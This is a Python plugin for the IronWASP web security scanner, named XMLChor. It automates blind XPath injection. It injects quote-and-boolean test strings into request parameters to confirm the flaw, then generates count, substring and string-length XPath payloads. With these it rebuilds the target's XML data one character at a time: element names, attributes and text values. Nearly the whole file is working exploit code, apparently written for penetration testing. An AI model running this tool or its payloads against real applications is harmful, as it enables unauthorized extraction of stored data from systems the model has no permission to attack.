from IronWASP import *
import re


#Extend the Module base class
class XMLChor(Module):


  #Implement the GetInstance method of Module class. This method is used to create new instances of this module.
  def GetInstance(self):
    m = XMLChor()
    m.Name = 'XMLChor'
    return m


  #Implement the StartModule method of Module class. This is the method called by IronWASP when user tries to launch the moduule from the UI.
  def StartModuleOnSession(self, sess):
    #IronConsole is a CLI window where output can be printed and user input accepted
    self.console = IronConsole()
    self.console.SetTitle('XML_Chor')
    #Add an event handler to the close event of the console so that the module can be terminated when the user closes the console
    self.console.ConsoleClosing += lambda e: self.close_console(e)
    self.console.ShowConsole()
    #'Print' prints text at the CLI. 'PrintLine' prints text by adding a newline at the end.
    self.console.Print('[*] Getting scan settings from user...')
    self.ex = Exploiter()
    self.console.PrintLine("exploiter class object created")
    f = Fuzzer.FromUi(sess.Request)
    self.f = f
    if not f.HasMore():
      self.console.PrintLine('no scan settings provided. Scan cannot be proceed. Close this window.')
      return
    f.SetLogSource('XMLChor')
    self.console.PrintLine('done!')


    # self.console.PrintLine('[*] Enter the payloads to be used for the scan below. (One payload per line)')
    # #'Read' accepts multi-line input from the user through the CLI. 'ReadLine' accepts single line user input.
    # payloads_input = self.console.Read()
    # #We are getting the payloads list from user only to demonstarte the user input feature.
    # payloads = payloads_input.split("\r\n")
    # if len(payloads)== 0:
    #   payloads = ['']

    # self.console.PrintLine('[*] Payloads recieved, starting the scan.')

    while f.HasMore():
      f.Next()
      preInjectVal="3"
      

      prevalue=self.check_quoteandoperator(preInjectVal)
      #prefix
      if(prevalue!=""):
        self.console.PrintLine("will now get bool value with double quote and: "+prevalue["prefix"]+":"+prevalue["quote"])
      #elif(self.check_quoteandoperator(preInjectVal,'"',"or")):
      #  self.console.PrintLine("will now get bool value with double quote and or")



      #ex.IsTrue("x", t1)
      #ex.IsTrue("x", f1)
      #ex.IsTrue("x", t3)
      #ex.IsTrue("x", f3)
      root_array=[1]
      self.get_XML_node_and_count(root_array, prevalue)


    self.console.PrintLine('[*] Scan completed')

  def check_quoteandoperator(self,preInjectVal):
      quoteValues=["'",'"']
      operatorValues=["and","or"]

      for quote in quoteValues:

        for operator in operatorValues:
          
          self.ex=Exploiter()
          true1=preInjectVal+quote+operator+quote+'1'+quote+'='+quote+'1'
          true2=preInjectVal+quote+operator+quote+'2'+quote+'='+quote+'2'
          true3=preInjectVal+quote+operator+quote+'3'+quote+'='+quote+'3'
          # self.console.PrintLine("will now get into fuzzer methods1: "+ true1)
          # self.console.PrintLine("will now get into fuzzer methods2: "+ true2)
          # self.console.PrintLine("will now get into fuzzer methods3: "+ true3)
          t1 = self.f.Inject(true1)
          t2 = self.f.Inject(true2)
          t3 = self.f.Inject(true3)
          false1=preInjectVal+quote+operator+quote+'1'+quote+'='+quote+'2'
          false2=preInjectVal+quote+operator+quote+'2'+quote+'='+quote+'3'
          false3=preInjectVal+quote+operator+quote+'3'+quote+'='+quote+'4'
          f1 = self.f.Inject(false1)
          f2 = self.f.Inject(false2)
          f3 = self.f.Inject(false3)
          # self.console.PrintLine("will now get into fuzzer methods11: "+ false1)
          # self.console.PrintLine("will now get into fuzzer methods22: "+ false2)
          # self.console.PrintLine("will now get into fuzzer methods33: "+ false3)
          self.ex.AddTrueConditionValues(true1 , t1)
          self.ex.AddTrueConditionValues(true2 , t2)
          self.ex.AddTrueConditionValues(true3, t3)
          self.ex.AddFalseConditionValues(false1, f1)
          self.ex.AddFalseConditionValues(false2, f2)
          self.ex.AddFalseConditionValues(false3, f3)
          # self.console.PrintLine("will now get into methods")
          # self.console.PrintLine("will now get into methods")
          # t1 = self.f.Inject('3" and "1"="1')
          # t2 = self.f.Inject('3" and "2"="2')
          # t3 = self.f.Inject('3" and "3"="3')

          # f1 = self.f.Inject('3" and "1"="2')
          # f2 = self.f.Inject('3" and "2"="3')
          # f3 = self.f.Inject('3" and "3"="4')

          # self.ex.AddTrueConditionValues('3" and "1"="1', t1)
          # self.ex.AddTrueConditionValues('3" and "2"="2', t2)
          # self.ex.AddTrueConditionValues('3" and "3"="3', t3)
          # self.ex.AddFalseConditionValues('3" and "1"="2', f1)
          # self.ex.AddFalseConditionValues('3" and "2"="3', f2)
          # self.ex.AddFalseConditionValues('3" and "3"="4', f3)
          # self.console.PrintLine(self.ex.IsBoolWorking())
          self.console.PrintLine(self.ex.IsBoolWorking())
          if(self.ex.IsBoolWorking()):
            prefix=preInjectVal+quote+operator
            preval={"prefix":prefix,"quote":quote}
            return preval
      return ""    
      
           
      


  def payload_generator(self, info, operator, value):
    left = ""
    right = ""
    prevalue=info["prevalue"]
    #self.console.PrintLine("In Payload Generator method:"+prevalue["prefix"]+":"+prevalue["quote"])
    quote=prevalue["quote"]
    myarray=info["node_index"]
    if info["type"] == "get_node_count":
      if len(info["node_index"]) == 1:
        left = "count(/*)"
      elif len(info["node_index"]) == 2:
        left = "count(/*/*)"
      else:
        left="count(/*"
        node_range_index=""
        for i in range (len(info["node_index"])-2):
          node_range_index=node_range_index + "/*[{0}]".format(myarray[i+1])
          #print "node_range_index" + node_range_index
        left=left + node_range_index + "/*)" 
        #print "left using loop" + str(left) 
      right = operator + value + " and "+quote+"1"+quote+"="+quote+"1"
    elif info["type"] == "get_attr_count":
      if len(info["node_index"]) == 1:
        left = "count(/*/@*)"
      elif len(info["node_index"]) == 2:
        left = "count(/*/*[{0}]/@*)".format(myarray[1])
      # elif len(info["node_index"])==3:
      #   left="count(/*/*[{0}]/*[{1}]/@*)".format(myarray[1],myarray[2])
      else:
        left="count(/*"
        node_range_index=""
        for i in range (len(info["node_index"])-2):
          #node_array=info["node_index"]
          node_range_index=node_range_index + "/*[{0}]/*[{1}]".format(myarray[i+1],myarray[i+2])
        left=left + node_range_index + "/@*)"
      right = operator + value + " and "+quote+"1"+quote+"="+quote+"1" 
    elif info["type"] == "get_node_name_char":
      if len(info["node_index"]) == 1:
        left = "substring(name(/*),{0},1)".format(info["char_index"])
      elif len(info["node_index"]) == 2:
        left = "substring(name(/*/*),{0},1)".format(info["char_index"])
      # elif len(info["node_index"]) == 3:
      #   left = "substring(name(/*/*[{0}]/*[{1}]),{2},1)".format(myarray[1],myarray[2],info["char_index"])
      else:
        left="substring(name(/*"
        node_range_index=""
        for i in range (len(info["node_index"])-2):
          node_range_index=node_range_index + "/*[{0}]/*[{1}])".format(myarray[i+1],myarray[i+2])
        left=left+node_range_index+",{0},1)".format(info["char_index"])
      right = operator + quote + value
    elif info["type"] == "get_node_value_char":
      if len(info["node_index"]) == 1:
        left = "substring((/*/text()),{0},1)".format(info["char_index"])
      elif len(info["node_index"]) == 2:
        left = "substring((/*/*/text()),{0},1)".format(info["char_index"])
      # elif len(info["node_index"]) == 3:
      #   left = "substring((/*/*[{0}]/*[{1}]/text()),{2},1)".format(myarray[1],myarray[2],info["char_index"]) 
      else:
        left="substring((/*"
        node_range_index=""
        for i in range (len(info["node_index"])-2): 
          node_range_index=node_range_index + "/*[{0}]/*[{1}]".format(myarray[i+1],myarray[i+2])
        left=left+node_range_index+"/text()),{0},1)".format(info["char_index"])
      right = operator + quote + value
    elif info["type"] == "get_attr_name_char":
      if len(info["node_index"]) == 1:
        left = "substring(name(/*/@*[{0}]),{1},1)".format(info["attr_index"],info["char_index"])
      elif len(info["node_index"]) == 2:
        left = "substring(name(/*/*/@*[{0}]),{1},1)".format(info["attr_index"],info["char_index"])
      # elif len(info["node_index"]) == 3:
      #   left = "substring(name(/*/*[{0}]/*[{1}]/@*[{2}]),{3},1)".format(myarray[1],myarray[2],info["attr_index"],info["char_index"]) 
      else:
        left="substring(name(/*"
        node_range_index=""
        for i in range (len(info["node_index"])-2):
          node_array=info["node_index"]
          node_range_index=node_range_index +"/*[{0}]/*[{1}]".format(myarray[i+1],myarray[i+2])
        left=left+node_range_index+"/@*[{0}]),{1},1)".format(info["attr_index"],info["char_index"])
      right = operator + quote + value
    elif info["type"] == "get_attr_value_char":
      if len(info["node_index"]) == 1:
        left = "substring((/*/@*[{0}]),{1},1)".format(info["attr_index"],info["char_index"])
      elif len(info["node_index"]) == 2:
        left = "substring((/*/*[{0}]/@*[{1}]),{2},1)".format(myarray[1],info["attr_index"],info["char_index"])
      # elif len(info["node_index"]) == 3:
      #   left = "substring((/*/*[{0}]/*[{1}]/@*[{2}]),{3},1)".format(myarray[1],myarray[2],info["attr_index"],info["char_index"])
      else:
        left="substring((/*"
        node_range_index=""
        for i in range (len(info["node_index"])-2):
          node_array=info["node_index"]
          node_range_index=node_range_index +"/*[{0}]/*[{1}]".format(myarray[i+1],myarray[i+2])
        left=left+node_range_index+"/@*[{0}]),{1},1)".format(info["attr_index"],info["char_index"])
      right = operator +quote+ value
    elif info["type"] == "get_node_value_length":
      if len(info["node_index"]) == 1:
        left = "string-length(/*/text())"
      elif len(info["node_index"]) == 2:
        left = "string-length(/*/*/text())"
      # elif len(info["node_index"]) == 3:
      #   left = "string-length(/*/*[{0}]/*[{1}]/text())".format(myarray[1],myarray[2])
      else:
        left="string-length(/*"
        node_range_index=""
        for i in range (len(info["node_index"])-2):
          node_range_index=node_range_index +"/*[{0}]/*[{1}]".format(myarray[i+1],myarray[i+2])
        left=left+node_range_index+"/text())"
      right = operator + value + " and "+quote+"1"+quote+"="+quote+"1"
    elif info["type"] == "get_attr_value_length":
      if len(info["node_index"]) == 1:
        left = "string-length(/*/@*[{0}])".format(info["attr_index"])
      elif len(info["node_index"]) == 2:
        left = "string-length(/*/*[{0}]/@*[{1}])".format(myarray[1],info["attr_index"])
      # elif len(info["node_index"]) == 3:
      #   left = "string-length(/*/*[{0}]/*[{1}]/@*[{2}])".format(myarray[1],myarray[2],info["attr_index"])
      else:
        left="string-length(/*"
        node_range_index=""
        for i in range (len(info["node_index"])-2):
          node_range_index=node_range_index +"/*[{0}]/*[{1}]".format(myarray[i+1],myarray[i+2])
        left=left+node_range_index+"/@*[{0}])".format(info["attr_index"])
      right = operator + value + " and "+quote+"1"+quote+"="+quote+"1"
    elif info["type"] == "get_node_name_length":
      if len(info["node_index"]) == 1:
        left = "string-length(name(/*))"
      elif len(info["node_index"]) == 2:
        left = "string-length(name(/*/*))"
      # elif len(info["node_index"]) == 3:
      #   left = "string-length(name(/*/*[{0}]/*[{1}]))".format(myarray[1],myarray[2])
      else:
        left="string-length(name(/*"
        node_range_index=""
        for i in range (len(info["node_index"])-2):
          node_range_index=node_range_index +"/*[{0}]/*[{1}]".format(myarray[i+1],myarray[i+2])
        left=left+node_range_index+"))"
      right = operator + value + " and "+quote+"1"+quote+"="+quote+"1"
    elif info["type"] == "get_attr_name_length":
      if len(info["node_index"]) == 1:
        left = "string-length(name(/*/@*[{0}]))".format(info["attr_index"])
      elif len(info["node_index"]) == 2:
        left = "string-length(name(/*/*[{0}]/@*[{1}]))".format(myarray[1],info["attr_index"])
      # elif len(info["node_index"]) == 3:
      #   left = "string-length(name(/*/*[{0}]/*[{1}]/@*[{2}]))".format(myarray[1],myarray[2],info["attr_index"])
      else:
        left="string-length(name(/*"
        node_range_index=""
        for i in range (len(info["node_index"])-2):
          node_range_index=node_range_index +"/*[{0}]/*[{1}]".format(myarray[i+1],myarray[i+2])
        left=left+node_range_index+"/@*[{0}]))".format(info["attr_index"])
      right = operator + value + " and "+quote+"1"+quote+"="+quote+"1"
    return prevalue["prefix"] +" " +left + right
  
  def get_XML_node_and_count(self, root_node_index,prevalue):
    if(self.ex.IsBoolWorking()):
     # self.console.PrintLine("will now get bool value with double quote and: "+prevalue)
      info = {"type":"get_node_name_length", "node_index":root_node_index,"prevalue":prevalue}#set info to get the length of first node name
      node_name_length = self.ex.FindNum(self.payload_generator, info, self.f)
      #print "Node name length is " + str(node_name_length)
      node_name = ""
      for i in range(node_name_length):
        info = {"type":"get_node_name_char", "node_index":root_node_index, "char_index":i+1,"prevalue":prevalue}#set info to get the character from first node name based on index
        node_name = node_name + self.ex.FindChar(self.payload_generator, info, self.f, " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
      self.console.Print("<" + str(node_name)+"\t")
      info = {"type":"get_attr_count", "node_index":root_node_index,"prevalue":prevalue}
      attr_count = self.ex.FindNum(self.payload_generator, info, self.f)
      if(attr_count>0):
        #print "Attribute count is " + str(attr_count)
        for i in range(attr_count):
          info = {"type":"get_attr_name_length", "node_index":root_node_index,"attr_index":i+1,"prevalue":prevalue}#set info to get the length of first node name
          attr_name_length = self.ex.FindNum(self.payload_generator, info, self.f)
          #print "Attribute name length is " + str(attr_name_length)
          attr_name = ""
          for j in range(attr_name_length):
            info = {"type":"get_attr_name_char", "node_index":root_node_index, "char_index":j+1,"attr_index":i+1,"prevalue":prevalue}#set info to get the character from first node name based on index
            attr_name = attr_name + self.ex.FindChar(self.payload_generator, info, self.f, " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
          info = {"type":"get_attr_value_length", "node_index":root_node_index,"attr_index":i+1,"prevalue":prevalue}#set info to get the length of first node name
          attr_value_length = self.ex.FindNum(self.payload_generator, info, self.f)
          #print "Attribute value length is " + str(attr_value_length)
          attr_value = ""
          for j in range(attr_value_length):
            info = {"type":"get_attr_value_char", "node_index":root_node_index, "char_index":j+1,"attr_index":i+1,"prevalue":prevalue}#set info to get the character from first node name based on index
            attr_value = attr_value + self.ex.FindChar(self.payload_generator, info, self.f, " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
          self.console.Print(str(attr_name) + " = " + str(attr_value))

      #else:
        #print "No attribute is present"

      self.console.PrintLine(">")
      child_array=[1]
      node_count_index = root_node_index + child_array
      #print "NODE Count Index: "+ str(node_count_index)
      info = {"type":"get_node_count", "node_index":node_count_index,"prevalue":prevalue}
      node_count = self.ex.FindNum(self.payload_generator, info, self.f)
      
      if(node_count>0):
        #print "Node count is"  + str(node_count)     
        for i in range(node_count):
          child_node_index=[i+1]
          child_index=root_node_index + child_node_index
          #print "child_index: "+ str(child_index)
          self.get_XML_node_and_count(child_index,prevalue)   
      #else:
        #print "No child is present"
      #print "RRRRoot_node_index" + str(root_node_index)
      first_node_value = ""
      if(node_count==0):
        info = {"type":"get_node_value_length", "node_index":root_node_index,"prevalue":prevalue} #set info to get the length of first node name
        first_node_value_length = self.ex.FindNum(self.payload_generator, info, self.f)
        #print "Node value length is " + str(first_node_value_length)
        
        for i in range(first_node_value_length):
          info = {"type":"get_node_value_char", "node_index":root_node_index, "char_index":i+1,"prevalue":prevalue}#set info to get the character from first node name based on index
          first_node_value = first_node_value + self.ex.FindChar(self.payload_generator, info, self.f, " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
        #print "Node value is " + first_node_value
      self.console.PrintLine(first_node_value + "</"+ str(node_name) + ">")
  
    else:
      self.console.PrintLine("Exploitation can't be done")
  
  def close_console(self, e):
    #This method terminates the main thread on which the module is running
    self.StopModule()



#This code is executed only once when this new module is loaded in to the memory.
#Create an instance of the this module
m = XMLChor()
#Call the GetInstance method on this instance which will return a new instance with all the approriate values filled in. Add this new instance to the list of Modules
Module.Add(m.GetInstance())


